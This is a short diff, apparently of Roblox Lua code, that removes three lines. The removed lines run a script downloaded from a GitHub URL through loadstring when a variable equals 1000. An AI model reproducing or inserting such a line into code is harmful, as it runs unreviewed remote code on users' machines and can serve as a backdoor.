@@ -1,3 +1,0 @@
-if a == 1000 then
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/moran701/morandingzhi/refs/heads/main/%E9%A1%B9%E7%9B%AE'))()
-end
